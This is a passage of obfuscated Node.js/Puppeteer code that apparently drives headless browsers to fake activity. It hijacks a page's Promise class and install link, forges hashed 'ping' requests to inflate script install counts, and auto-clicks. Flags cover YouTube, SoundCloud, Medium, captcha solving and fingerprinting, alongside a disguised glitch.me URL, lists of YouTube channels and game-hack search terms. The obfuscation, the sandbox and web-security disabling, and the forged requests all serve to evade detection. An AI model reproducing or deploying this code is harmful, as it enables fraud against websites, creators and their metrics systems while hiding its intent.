-0x1f75 * -0x1] |= (0x1 * 0x1993 + 0x1456 + 0x9b * -0x4b | L >> 0x4 * -0x44a + 0x1 * 0x10ff + 0x1 * 0x35 & -0x185a + 0x109a + 0x7ff) << y[0x1 * -0x251 + 0x1f57 * 0x1 + -0x1 * 0x1d03 & N++], P[N >> 0x2e * 0x50 + -0x1a2 + -0xcbc] |= (-0x3 * -0x482 + 0x49e + -0x4 * 0x469 | L >> -0x266 * -0xd + 0x1554 + -0x347c & -0x380 + 0x1c4b + -0x188c) << y[0x158a + -0x6e2 * 0x3 + -0xe1 & N++], P[N >> -0x119 * 0x16 + 0x1204 + 0x624] |= (0x104 + 0x14 * -0xbf + 0x734 * 0x2 | -0x19b4 + -0x11 * -0x77 + 0x120c & L) << y[-0x11 * 0x44 + 0x96e + 0x5 * -0xfb & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x145c * -0x1 + -0x409 * -0x7 + 0x1 * -0x305b ? (this['block'] = P[0x5c9 * -0x3 + -0x1f7f + 0x1 * 0x30ea], this['start'] = N - (0x11ad + -0x1bc8 + 0xa5b), this['hash'](), this['hashed'] = 0xe48 * 0x1 + 0x172e + -0x2575) : this['start'] = N;
                }
                return this['bytes'] > -0xbff232d7 + 0x2d72296f * -0x5 + -0xe10f00ab * -0x3 && (this['hBytes'] += this['bytes'] / (-0x32297b90 + 0xce448 * -0x16c3 + -0x2 * -0x12bccc734) << 0x10c * -0x7 + -0xd1d + 0x1471 * 0x1, this['bytes'] = this['bytes'] % (-0x15da71780 * -0x1 + -0x982 * -0x15fce2 + -0x975aba22 * 0x2)), this;
              }
            }
            ['finalize']() {
              const W = d;
              if (!this[W(0x18)]) {
                this['finalized'] = 0x11 * -0x181 + 0x164a + -0x38 * -0xf;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x22c4 + -0x22 + 0x22f6] = this['block'], J[K >> 0x1 * 0xf29 + -0xc * -0x2f7 + -0x1b * 0x1e1] |= x[-0x6 * 0x241 + -0xa * 0x2ab + -0x80b * -0x5 & K], this['block'] = J[-0x119 * -0xf + 0x331 * 0xb + 0x13 * -0x2b6], K >= -0x1c4d + -0x13 * 0x121 + 0x1ec * 0x1a && (this['hashed'] || this['hash'](), J[-0x106 * 0x8 + -0x95 + 0x8c5] = this['block'], J[-0x1 * 0x148d + 0x3df * 0x7 + 0x2 * -0x33e] = J[0xc10 + 0x6d6 + -0x2b3 * 0x7] = J[0x1526 + 0x2 * 0x277 + 0x8e * -0x2f] = J[0x1 * -0x14f3 + 0x5fc + 0xefa] = J[0xf7e * -0x2 + 0x423 * 0x4 + 0x14 * 0xb9] = J[0x1b7c + 0x1 * 0x1a3b + -0x35b2] = J[-0x153b + 0x23cf * -0x1 + 0x3910] = J[0x1fe4 + 0x2534 + -0x4511 * 0x1] = J[-0x1d7 + 0x2e4 + -0x3 * 0x57] = J[0x1f23 + 0x22b1 + 0x1 * -0x41cb] = J[0x59a + -0x200d * 0x1 + -0x1a7d * -0x1] = J[0x1 * 0x1f3 + 0x1b * 0xef + 0x277 * -0xb] = J[-0x1f3d * 0x1 + 0x6 * -0x127 + 0x2633] = J[0x5 * -0x62b + -0x2136 + -0x155e * -0x3] = J[-0x1abb + -0x2 * -0x17 + 0x31 * 0x8b] = J[0x4 * -0x6fc + 0x2600 + -0xa01] = -0x14b + 0x2217 + -0x20cc), J[0x37b * -0xb + -0x1f * 0x24 + 0x2ab3] = this['hBytes'] << 0x1 * -0x649 + 0x50a + 0x142 | this['bytes'] >>> -0x18f6 + 0xb * 0x1fd + 0x334, J[0x892 + -0x1a05 + 0xa6 * 0x1b] = this['bytes'] << 0x3 * 0x629 + -0x82b + -0x1 * 0xa4d, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x11d9 + -0x3d1 * 0x1 + 0x15ba; J < -0x7cd * 0x3 + -0x14 * 0x133 + 0x2fb3; ++J)
                K = Q[J - (0x131 * 0x2 + -0x1f39 + 0x1cda)] ^ Q[J - (0xb54 + 0x2 * -0xb + 0xa * -0x11f)] ^ Q[J - (0x9 * -0x214 + 0x15ea * 0x1 + 0x4 * -0xca)] ^ Q[J - (-0x1523 + 0xb85 + 0x9ae)], Q[J] = K << -0x1b90 + 0x1308 + -0x5f * -0x17 | K >>> -0x4e1 + -0x221 * -0xe + -0xc67 * 0x2;
              for (J = -0x10b8 + -0x1208 * 0x2 + 0x34c8; J < 0x69 * 0x27 + -0x2347 + 0x135c; J += 0xddf + 0x13 * 0x5c + -0x14ae)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1360 + -0x47 * 0x23 + 0x1d1a | L >>> -0x25d6 + 0x2013 + 0x5de) + (M & N | ~M & O) + P + (-0x2cb0e329 + 0x9b8f4180 + -0x9c746 * 0x215) + Q[J] << -0x196f + 0x2 * 0x11d9 + -0x1 * 0xa43) << -0x84d + -0x3 * -0x352 + -0x1a4 | P >>> 0x6c0 + -0x19af * 0x1 + 0x130a) + (L & (M = M << 0x107 * -0x6 + 0x2 * 0x633 + 0x2 * -0x30f | M >>> -0x95e * 0x1 + 0x1 * 0x1f46 + 0xaf3 * -0x2) | ~L & N) + O + (-0x69b94c16 + 0x9 * 0xd0d71bc + 0x59 * 0xe28c4b) + Q[J + (0x3ca * -0x6 + 0x1 * 0x225d + -0xba0)] << 0x3 * -0x19 + 0x5 * 0x532 + -0x19af) << 0x129c + 0x6d6 * -0x4 + 0x8c1 | O >>> -0x1b61 + 0x1b30 + 0x4c) + (P & (L = L << 0x2 * 0x11ba + 0x1a8f + -0x3de5 * 0x1 | L >>> 0x1c9 * 0x9 + -0x9e3 + 0x13c * -0x5) | ~P & M) + N + (0x2db8045 * 0x3b + 0x1bec * 0x5b53f + 0x26 * -0x63fb4ab) + Q[J + (0x2094 + -0x6f6 + -0x199c)] << 0x45f * 0x7 + -0x7 * 0x3a9 + -0xb6 * 0x7) << 0x1615 * -0x1 + -0x2 * 0xe57 + -0x68 * -0x7d | N >>> 0x1ec5 * -0x1 + -0x21db + -0x49 * -0xe3) + (O & (P = P << -0x44 * 0x6d + 0x16f * -0x17 + 0x1 * 0x3e0b | P >>> -0x1ed1 + 0x3 * -0xc4b + 0x43b4) | ~O & L) + M + (0x1e * 0x291d56c + 0x1e3125 * 0x3bd + -0x63724060) + Q[J + (-0x169c + 0x1 * 0x2327 + -0xc88)] << -0xb * 0x13a + -0x8 * 0x1b4 + 0x2 * 0xd8f) << 0x33 * -0x81 + 0x59 * 0x4d + -0x10d | M >>> 0x4 * -0x654 + 0x1 * 0x1a05 + -0x4d * 0x2) + (N & (O = O << 0x1259 * -0x1 + -0x5 * -0x79c + 0x1 * -0x1395 | O >>> 0x45e * 0x2 + 0x4aa + 0x1 * -0xd64) | ~N & P) + L + (-0xc41b9f5 + 0x1 * -0x337aa6e5 + 0x9 * 0x11236d9b) + Q[J + (0x2 * 0xbf5 + 0xf1c + -0x1 * 0x2702)] << -0xcce * 0x2 + -0x3d * -0x9f + -0x1 * 0xc47, N = N << 0x1985 + -0x1 * -0x13 + -0x197a | N >>> -0x1e61 + -0x1e41 + 0x3ca4;
              for (; J < -0x10d * -0x22 + -0x705 * 0x1 + -0x1c8d; J += 0x11 * -0x1e7 + -0x5 * -0x235 + 0x35 * 0x67)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xb2 * -0x11 + -0x49a + 0x1071 | L >>> 0x1c5e + -0x17 * 0x185 + 0x6b0) + (M ^ N ^ O) + P + (0x81322392 + 0x1 * 0x1d7c9803 + -0x2fd4cff4) + Q[J] << 0x2b6 + 0x524 + -0x2 * 0x3ed) << 0x1ad3 + -0x5d9 * 0x3 + -0x1 * 0x943 | P >>> -0x1458 + 0x18bd + 0x7a * -0x9) + (L ^ (M = M << 0x7c + -0xb6 * 0x23 + -0xc42 * -0x2 | M >>> 0xb03 + -0xffd + 0x4fc) ^ N) + O + (0x7a * -0x136b819 + 0x5636d38f + 0x2b2db4ff * 0x4) + Q[J + (-0x1f * 0xb + 0x5 * 0x44f + -0x1435)] << 0x6b2 + 0x26c8 + -0x16bd * 0x2) << 0x275 * -0x4 + 0x11ae * -0x1 + -0x9 * -0x30f | O >>> -0x92b * -0x1 + -0x9b6 + 0xa6 * 0x1) + (P ^ (L = L << -0x2 * -0x35a + -0x87e + 0x1e8 | L >>> -0x451 + 0x1383 + -0xf30) ^ M) + N + (0x17 * 0x4688bca + 0x2 * -0x6b2aea1d + 0xdfcb30b5) + Q[J + (0xf55 + -0x305 * -0x5 + -0xc * 0x289)] << 0xfd * -0x2 + -0x1 * 0x1c51 + 0x1e4b) << -0x2b3 * 0x2 + -0x1489 + 0x19f4 | N >>> 0xa19 + 0x4 * -0x99b + -0x1 * -0x1c6e) + (O ^ (P = P << -0x3 * 0x10f + 0x247 * 0x4 + -0x5d1 | P >>> 0x26a5 + -0x6a3 + 0x20 * -0x100) ^ L) + M + (0x85e1ee40 + -0x9c250f * 0x152 + 0xef2f * 0xc401) + Q[J + (-0x61 + 0x13b * -0x1 + 0x19f * 0x1)] << 0x2ff * -0x3 + 0xdb9 + -0x4bc) << 0x1 * 0xf31 + -0x1 * -0x1cde + -0x2c0a | M >>> -0x1029 * -0x1 + 0x8 * 0x13 + -0x10a6) + (N ^ (O = O << -0x1ace + -0x379 * 0x7 + 0x333b | O >>> 0x1456 + -0x190f + 0x4bb) ^ P) + L + (-0xd8eb45f2 + 0xbf86bd87 + 0x883e740c) + Q[J + (0x8de + 0x161 * 0x11 + -0x7 * 0x49d)] << 0x1fe3 + -0x324 + -0x1cbf, N = N << 0x14bb + 0x14a2 + 0x293f * -0x1 | N >>> -0x2a * 0x1c + 0x21 * -0x115 + 0x284f;
              for (; J < 0xd * -0x8 + 0x37e * 0xb + -0x2 * 0x12e3; J += 0x17b7 + -0x2 * 0xbab + -0x5c)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x536 + -0x1 * -0x1d25 + -0x17ea | L >>> 0x1 * -0x255f + 0xc8b + -0xd * -0x1eb) + (M & N | M & O | N & O) + P - (0x1 * -0xcf95a9ee + -0x41c43409 * -0x3 + 0x7b2d50f7) + Q[J] << 0x18ec + -0x1e17 + -0x9 * -0x93) << 0x17bb + -0x1e7 * 0x1 + 0x15cf * -0x1 | P >>> 0xb23 * 0x2 + 0x5 * -0x365 + -0x5 * 0x10a) + (L & (M = M << 0xa8f + -0x5c + 0xa15 * -0x1 | M >>> 0xf09 + -0x3 * -0x3ff + 0x6c1 * -0x4) | L & N | M & N) + O - (0xced1e8af + -0x6c * 0x95ade3 + -0x1ec849c7) + Q[J + (0x2629 + -0x26da + 0x59 * 0x2)] << 0x54f + -0x1633 + -0x17 * -0xbc) << 0x1 * 0x1e95 + 0x2582 + -0x2 * 0x2209 | O >>> 0x15db + -0x1185 + -0x43b) + (P & (L = L << -0x81d * -0x1 + -0x939 * -0x4 + -0x2ce3 | L >>> -0xffb + 0x1312 + -0x315) | P & M | L & M) + N - (0xc00f2b95 * 0x1 + 0xd243601c + -0x49df67 * 0x3eb) + Q[J + (0x7b + -0xb * -0x2db + -0x173 * 0x16)] << -0x1d3d + 0xc72 + -0x1 * -0x10cb) << 0x59a + -0x5af + 0x1a | N >>> -0x1 * 0x1f7 + 0x7 * -0x168 + 0x262 * 0x5) + (O & (P = P << -0x1 * -0xc1a + -0x2d * 0xcb + 0x17b3 | P >>> 0x4 * -0x5f0 + 0x1 * -0x1ffa + 0x37bc) | O & L | P & L) + M - (0x5 * -0x23142a77 + 0x8f1e85de + 0x9f1 * 0xe9a29) + Q[J + (-0x5 * 0x6e1 + -0x1e5d + 0x40c5)] << 0x1545 + 0xc91 * 0x3 + -0x3af8) << 0x675 + 0xabf + -0x112f | M >>> 0x7b3 + 0x1 * -0x3ef + -0x3a9) + (N & (O = O << 0x38 * 0x25 + 0x158a + -0x1d84 | O >>> 0x18d2 + -0xe83 + -0xa4d) | N & P | O & P) + L - (-0x2f5c65cd + 0x2cf14f * 0x1e7 + 0xef38588 * 0x5) + Q[J + (-0x2106 + 0x2215 + -0x1 * 0x10b)] << 0x1 * -0x99d + -0x221 * 0x6 + 0x1663, N = N << 0x15e + -0x1123 * 0x2 + 0x2106 | N >>> -0x2460 + -0x13cf * 0x1 + 0x3831;
              for (; J < -0xd2b * -0x1 + -0x13ef + 0x714 * 0x1; J += -0x1f03 * -0x1 + -0x1241 + -0xcbd)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x191 * -0x17 + 0x5 * 0xbf + -0x27bd * 0x1 | L >>> 0x62 * -0x4 + -0xe3 * 0x14 + -0x135f * -0x1) + (M ^ N ^ O) + P - (0x423bde8f + 0x4b51a780 + 0xa4c5 * -0x88a1) + Q[J] << -0x13c3 + -0x1 * 0x2c9 + 0x4 * 0x5a3) << -0x11 * -0x74 + -0x1ff6 + 0x1847 | P >>> -0x1301 + 0x1482 + -0x166) + (L ^ (M = M << -0x7 * 0x347 + -0xed9 + 0x1 * 0x25e8 | M >>> -0x43 * -0x45 + -0x2283 + -0xe * -0x12d) ^ N) + O - (0x24d8a60f + -0x4976c66a + -0x5a3b5e85 * -0x1) + Q[J + (0x2707 + 0x1dde + -0x44e4)] << 0x157b + 0x7c * 0xd + -0x1bc7) << 0x3 * -0x284 + -0x23c9 + 0x15ad * 0x2 | O >>> -0x1c85 + 0x2181 + 0x4e1 * -0x1) + (P ^ (L = L << -0x15b * -0xa + -0x120e + 0x49e | L >>> -0x1 * -0x20a5 + -0x16ac + 0x1 * -0x9f7) ^ M) + N - (0x1dda5e * -0x379 + -0xca9bed1 * 0x6 + -0x338e * -0x48649) + Q[J + (-0x9 * 0x26 + 0x60 * -0x45 + 0x1b38)] << 0xb5e + 0x1 * -0x140e + 0x8b0) << -0x9f1 * 0x2 + -0x177c + 0x2b63 | N >>> -0x496 * -0x2 + -0x2 * 0x11cb + 0x1 * 0x1a85) + (O ^ (P = P << 0x19 * -0x174 + 0x43c + 0x2036 | P >>> -0x20f5 + -0xc51 + 0x2d48) ^ L) + M - (-0x2e23e6b * -0x18 + -0x3cd68321 * -0x1 + -0x17130e3 * 0x35) + Q[J + (-0x26aa + 0x14c * 0x16 + 0x31 * 0x35)] << 0x1374 + 0xe88 + -0x91 * 0x3c) << 0x121c + 0x181b + -0x3d6 * 0xb | M >>> 0x46a * -0x1 + -0x2043 * 0x1 + -0x2 * -0x1264) + (N ^ (O = O << -0x9 * -0x2dd + 0x303 + -0x1caa | O >>> -0xf * 0x25e + 0x1779 + -0xc0b * -0x1) ^ P) + L - (-0x36119513 + 0x292dc7db + 0x42810b62) + Q[J + (-0x1691 + 0x7f4 + 0xea1)] << 0x13 * 0x1f1 + 0x6da + 0x2bbd * -0x1, N = N << -0x1787 + 0x205c + 0x8b7 * -0x1 | N >>> 0x1c3a + -0x3a7 + -0x1891;
              this['h0'] = this['h0'] + L << -0x1a7e + 0x1 * 0x23e3 + -0x965, this['h1'] = this['h1'] + M << 0x116f + 0x3 * 0xa33 + -0x3008, this['h2'] = this['h2'] + N << 0x764 * 0x1 + -0x70 * 0x20 + 0x69c, this['h3'] = this['h3'] + O << 0xebc + -0x19d2 + -0x56 * -0x21, this['h4'] = this['h4'] + P << 0x4c0 * -0x3 + 0x2ef * -0x1 + 0x112f;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x33 * 0x21 + 0xad9 * 0x2 + -0x1c29 & 0x1d6e + -0x3 * -0xc56 + 0x4261 * -0x1] + w[J >> -0x2 * -0x38b + 0x1 * 0x140c + 0x1b0a * -0x1 & 0x248e + -0x1 * 0x1ed3 + -0x5ac] + w[J >> 0x1e * -0x3b + 0x12f * -0x1f + 0x2baf * 0x1 & 0xce7 * 0x1 + 0x19d8 + -0x26b0] + w[J >> -0xf1a * 0x1 + 0x2692 + -0x1768 & -0x69b + -0x23b1 + 0x2a5b] + w[J >> 0xd4f + -0x2417 + 0x5b5 * 0x4 & 0x1b11 + 0x1cbf + 0x37c1 * -0x1] + w[J >> 0xb78 + -0x229c + 0x172c * 0x1 & 0x165a * -0x1 + -0xe52 + 0x24bb] + w[J >> 0x1ac3 + 0x1 * -0xaa2 + -0x101d & -0x207e + 0x1 * 0xd9a + 0x21 * 0x93] + w[0x1a40 + -0x8 * 0x2d4 + -0x53 * 0xb & J] + w[K >> 0x2359 * 0x1 + 0x249b + 0x1a2 * -0x2c & -0x122d + -0x89 * 0x2f + -0x1 * -0x2b63] + w[K >> 0x19b2 + -0x11ec + 0x7ae * -0x1 & -0x4e9 * 0x5 + -0xe * 0x18b + 0x2e36] + w[K >> 0x1 * -0xced + 0xaa2 * 0x2 + -0x843 & 0x2186 + 0x22 * -0xa8 + -0xb27 * 0x1] + w[K >> -0x1 * -0x14ea + 0x168d + -0x2b67 & 0x1283 + 0x661 + -0x18d5] + w[K >> -0x266a + 0x7e3 + 0x1e93 & -0x1a7f + -0x6a * 0x27 + -0x1 * -0x2ab4] + w[K >> -0x1fef + 0x9 * 0x1a5 + 0x112a & -0x1b7 + 0x59e * 0x4 + -0x14b2] + w[K >> 0x93b * 0x1 + 0x1c93 * -0x1 + 0x135c & -0xf2 + 0x1276 + -0x1175] + w[-0x14d3 + -0x3b * -0x7c + -0x7b2 * 0x1 & K] + w[L >> 0xd8c * 0x2 + -0x1c81 + 0x185 & 0x15cc + 0xcf2 + -0x1 * 0x22af] + w[L >> -0x3 * 0x7ff + -0x125f + 0x8f * 0x4c & -0x1 * -0xfc7 + -0x10e7 * 0x2 + 0x1216] + w[L >> -0x3 * -0x3cb + -0x1fba + 0x146d & -0x17e6 + 0x1347 + 0x4ae] + w[L >> -0x35 * 0x18 + -0xcc * -0x4 + -0x4 * -0x76 & 0x209e + 0x3 * 0x5b0 + -0x319f] + w[L >> -0x12 * -0x1f + 0x22eb + 0x23 * -0x10f & -0x95 + 0xdfc + -0xd58] + w[L >> 0x46d * -0x1 + 0x1871 * 0x1 + 0x9fe * -0x2 & 0x117f + 0x1646 + -0x13db * 0x2] + w[L >> 0x6c1 + 0x1993 * 0x1 + -0xb0 * 0x2f & 0x291 * 0x1 + 0xcd * 0x29 + -0x2357] + w[0x1cfd + -0xca5 * 0x3 + 0x901 & L] + w[M >> 0xf6 * -0x8 + 0x4bd * -0x7 + -0x1 * -0x28f7 & 0x8 * 0x354 + 0x7 * 0xe5 + -0x20d4 * 0x1] + w[M >> -0x334 + -0xdee * 0x1 + 0x46 * 0x3f & 0xeb9 * -0x1 + 0x1 * -0xa55 + 0x191d] + w[M >> -0x1a19 + 0x180e + -0x1 * -0x21f & 0x7 * -0x44f + -0x14f * 0x5 + 0x24c3 * 0x1] + w[M >> 0x1 * 0x4b2 + -0x16bc + -0x2 * -0x90d & 0x17b5 + -0x1bc5 * -0x1 + -0x336b] + w[M >> 0x20 * 0x52 + 0x1ce4 + -0x2718 & 0x2de + -0x9 * 0x422 + 0x2263] + w[M >> -0x1b33 + 0xa7c + 0x10bf & -0x8 * 0x33f + 0x297 * -0x7 + -0xeb8 * -0x3] + w[M >> 0x1022 + -0x24f7 + 0x14d9 & 0x11 * -0x9e + 0x1d * -0x9b + -0x404 * -0x7] + w[-0x1 * -0xe43 + -0x121e + 0x14e * 0x3 & M] + w[N >> 0x1e50 + 0x1519 + -0x334d & 0x3d1 * 0x9 + -0xefd + 0x66f * -0x3] + w[N >> -0x1 * 0x38f + -0x1 * -0x1e58 + -0x1ab1 & 0x1 * -0x202d + -0x66c + 0x2 * 0x1354] + w[N >> -0x12 * 0x17b + 0x5 * -0x280 + 0x139d * 0x2 & 0x4 * -0x44f + -0x9 * 0xca + 0x1 * 0x1865] + w[N >> -0x10f1 * -0x2 + -0x14b * -0xd + -0x3e5 * 0xd & -0x15a * 0x2 + -0x37c + 0x63f] + w[N >> 0x662 + -0x20 * 0x10b + -0x1b0a * -0x1 & -0x34 * 0x15 + 0x1ab * -0x3 + -0x31c * -0x3] + w[N >> -0x2 * -0x97c + 0x4 * 0x8ae + 0x1 * -0x35a8 & -0x7a5 * 0x1 + 0xdcf + -0x61b * 0x1] + w[N >> -0x6 * 0x9e + -0x2c * 0x3e + 0xe60 & -0x1d73 + 0x20ba + -0x338] + w[0x823 + -0x1 * 0x65b + -0x15 * 0x15 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x1195 * -0x1 + 0xa46 + 0x767 & -0x1 * -0x136f + 0xe58 + -0x20c8,
                J >> 0x5 * 0x1a3 + 0x53e + -0xd5d * 0x1 & -0x9e9 + -0x16dd + 0x299 * 0xd,
                J >> 0x9 * 0x145 + -0x9d7 + -0x18e & 0x4c * -0x1f + 0x6eb + 0x348,
                -0x2b6 * 0x1 + 0x16bc + 0x1 * -0x1307 & J,
                K >> -0xe84 + -0x7e8 + 0x1684 & -0xe15 * 0x1 + -0x5 * -0x796 + -0x16da,
                K >> -0x21 * -0x5d + -0x176e + 0xb81 & 0x25e + -0x1cac * 0x1 + 0x1d * 0xf1,
                K >> 0x1b3e + 0x7c0 + -0x22f6 & 0x3 * 0x989 + 0xa87 + -0x2623,
                0x7a * -0x7 + -0x2dd + 0x732 & K,
                L >> -0xb42 + -0x1fac * 0x1 + -0x1 * -0x2b06 & 0x25f9 + -0x6fd + -0x3 * 0x9ff,
                L >> 0x1765 + 0x1edd + -0x3632 & 0x4 * -0x96a + -0x13ae * 0x1 + 0x3a55,
                L >> 0xb57 + -0x13fc + 0x8ad & -0x1 * -0x1529 + -0x5 * -0x317 + -0x239d,
                -0x557 * 0x6 + -0x6a0 + -0xd * -0x30d & L,
                M >> 0x1 * -0xf10 + 0x2568 + 0x10 * -0x164 & -0x1156 + 0x1c0a + -0x9b5,
                M >> 0x2 * 0x40e + -0x13 * 0x43 + 0x313 * -0x1 & 0xe85 + 0x1 * 0x2330 + -0x30b6,
                M >> 0x9b5 + -0xb3a + -0x18d * -0x1 & -0x1 * 0xb6b + 0x222a * 0x1 + -0x15c0,
                -0xd3e + 0xadb * -0x2 + 0x1 * 0x23f3 & M,
                N >> 0x2481 + -0x1a7 * -0x7 + -0x2ffa & -0x8 * 0x439 + -0x1782 + -0x3a49 * -0x1,
                N >> -0x181a + -0xdf + 0x1909 & -0x874 + -0x17c4 + 0xb * 0x305,
                N >> 0xbd * -0x21 + 0x2a3 * -0x6 + 0x91 * 0x47 & 0x1c97 * -0x1 + -0xbc3 + -0x16d * -0x1d,
                -0x1 * 0x1d57 + 0x2 * -0x12bc + 0x43ce & N
              ];
            }
            [X(0x2) + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x2163 + -0xf * 0x24f + -0x883 * -0x8), (K = new DataView(J))['setUint32'](-0x1f7d + 0x108 * -0x14 + 0x341d, this['h0']), K['setUint32'](-0xaec + 0x1 * -0xcf1 + 0x17e1, this['h1']), K['setUint32'](-0x2453 + 0xf * -0xc7 + 0x7 * 0x6dc, this['h2']), K['setUint32'](-0x1939 + 0x24e1 + -0x1 * 0xb9c, this['h3']), K['setUint32'](-0x4e8 + 0x366 + 0x192, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x91d * 0x2 + 0x1f4d * -0x1 + 0xd13];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0xb * 0x3d + -0x1e2e + 0x20cd;
            J[-0x1777 + -0xe * -0x1e2 + -0x13 * 0x27]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0xb * 0x133 + -0x18b8 + 0xb87] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0xd4 + -0x13df + 0x130c), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0xdf * 0xb + 0x254 * 0x6 + -0x178c;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x1 * 0x26ad + -0x99 * -0x1 + -0x216a), Promise['resolve'](0x2b9 * -0x3 + 0x517 * -0x1 + 0xd43);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r[Y(0x1, 'SlQk')](), i());
    }
  }
  for (let j = 0x35 * 0x9d + 0x1eaf + -0x151 * 0x30; j < -0x1 * 0xa99 + 0x170f * 0x1 + 0xc75 * -0x1; j++)
    i();
}
const NETWORK_PATIENCE = -0x3916 + -0x364f * -0x1 + -0x2207 * -0x1 + (0xd71 + -0x26f4 + 0x253b) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x5f7 * 0x3 + 0x1938 + -0x750) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + Z(0x17) + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x1d15 + 0x1 * -0xa79 + -0x129c; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), 